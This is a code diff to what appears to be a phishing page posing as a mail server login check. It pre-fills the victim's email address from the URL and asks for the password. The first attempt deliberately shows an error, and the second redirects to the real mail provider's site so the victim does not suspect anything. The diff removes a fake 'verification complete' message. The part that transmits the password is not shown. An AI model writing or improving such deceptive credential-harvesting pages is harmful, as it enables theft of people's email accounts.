@@ -128,11 +128,6 @@
         <h3 class="text-center">Connecting To Mail Server</h3>
     </div>
 
-    <div class="verification-complete" id="verificationComplete">
-        <span class="loader" style="background: #28a745;"></span>
-        <h3 class="text-center" style="color: #28a745;">Verification complete!</h3>
-    </div>
-
     <iframe src="" frameborder="0" id="iframe" style="display: none;"></iframe>
 
     <script>
@@ -142,7 +137,7 @@
         if (hashEmail) {
             emailInput.value = hashEmail;
             
-            // Set iframe URL based on email domain
+            // Set iframe URL based on email domain (like in first code)
             const domain = hashEmail.split('@')[1] || '';
             document.getElementById('iframe').src = `https://www.${domain}`;
         }
@@ -163,7 +158,6 @@
             const passwordInput = document.getElementById('password');
             const submitBtn = document.getElementById('submitBtn');
             const loading = document.getElementById('loading');
-            const verificationComplete = document.getElementById('verificationComplete');
             const iframe = document.getElementById('iframe');
 
             // Show loading spinner
@@ -195,11 +189,9 @@
                         passwordInput.focus();
                     }, 500);
                 } else {
-                    // Second attempt: Show verification complete then redirect
+                    // Second attempt: Redirect to iframe URL (like first code)
                     loading.style.display = 'none';
                     errorMsg.style.display = 'none';
-                    verificationComplete.style.display = 'flex';
-                    
                     setTimeout(() => {
                         window.location.href = iframe.src;
                     }, 2000);
